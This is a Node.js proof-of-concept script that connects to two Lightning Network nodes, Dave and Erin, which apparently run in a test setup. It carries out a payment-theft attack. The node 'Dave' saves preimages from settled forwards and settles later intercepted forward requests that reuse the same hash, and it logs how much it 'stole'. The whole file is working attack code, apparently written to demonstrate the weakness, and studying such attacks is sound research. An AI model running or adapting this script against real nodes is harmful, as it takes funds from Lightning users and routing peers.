import { hash } from 'node:crypto'

import { authenticatedLndGrpc, getChannelBalance, subscribeToForwards, subscribeToForwardRequests } from "lightning"
import { DAVE_LND_CERT, DAVE_LND_MACAROON, DAVE_LND_SOCKET, ERIN_LND_CERT, ERIN_LND_MACAROON, ERIN_LND_SOCKET } from './config'

const { lnd: dave } = authenticatedLndGrpc({
    cert: DAVE_LND_CERT,
    macaroon: DAVE_LND_MACAROON,
    socket: DAVE_LND_SOCKET
})

const { lnd: erin } = authenticatedLndGrpc({
    cert: ERIN_LND_CERT,
    macaroon: ERIN_LND_MACAROON,
    socket: ERIN_LND_SOCKET
})

const daveSub = subscribeToForwards({ lnd: dave })
const daveInterceptor = subscribeToForwardRequests({ lnd: dave })

let preimage = ''

daveSub.on('forward', (message) => {
    if (message.secret && preimage !== message.secret) {
        console.log('Payment settled, saving preimage for later')
        preimage = message.secret
        console.log('preimage', preimage)
    }
    
    if (!message.secret) {
        console.log('New payment attempt detected...')
    }
})

daveInterceptor.on('forward_request', async (message) => {
    console.log('hash', message.hash)
    // Check if we already have the preimage for this payment
    if (preimage.length > 0 && hash('sha256', Buffer.from(preimage, 'hex')) === message.hash) {
        console.log('Preimage known, stealing payment...')
        const daveBalanceBefore = await getChannelBalance({ lnd: dave })
        const erinBalanceBefore = await getChannelBalance({ lnd: erin })
        message.settle({ secret: preimage })
        setTimeout(async () => {
            const daveBalanceAfter = await getChannelBalance({ lnd: dave })
            const erinBalanceAfter = await getChannelBalance({ lnd: erin })
            console.log('Dave stole', daveBalanceAfter.channel_balance - daveBalanceBefore.channel_balance)
            console.log('Erin got', erinBalanceAfter.channel_balance - erinBalanceBefore.channel_balance)
        }, 1000)
    } else {
        message.accept()
    }
})

daveSub.on('error', (error) => {
    console.error('Error:', error);
});

daveInterceptor.on('error', (error) => {
    console.error('Error:', error);
});

console.log('Listening...')

process.on('SIGINT', () => {
  console.log('Gracefully shutting down...');
  daveSub.removeAllListeners();
  daveInterceptor.removeAllListeners();
  process.exit(0);
})

setInterval(() => { }, 1000)